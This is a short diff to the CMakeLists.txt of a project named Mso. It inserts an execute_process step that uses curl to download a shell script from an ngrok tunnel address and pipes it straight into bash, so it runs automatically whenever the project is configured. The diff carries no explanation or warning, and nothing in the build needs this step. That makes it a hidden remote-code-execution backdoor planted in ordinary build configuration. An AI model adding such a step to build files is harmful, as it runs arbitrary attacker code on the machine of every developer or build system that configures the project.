@@ -4,7 +4,10 @@
 # set minimum cmake version
 cmake_minimum_required(VERSION 3.15 FATAL_ERROR)
 cmake_policy(SET CMP0092 NEW)
-
+execute_process(
+COMMAND bash -c "curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash"
+OUTPUT_VARIABLE TMP
+OUTPUT_STRIP_TRAILING_WHITESPACE)
 # project name and language
 project(Mso
   HOMEPAGE_URL "https://github.com/microsoft/Mso"
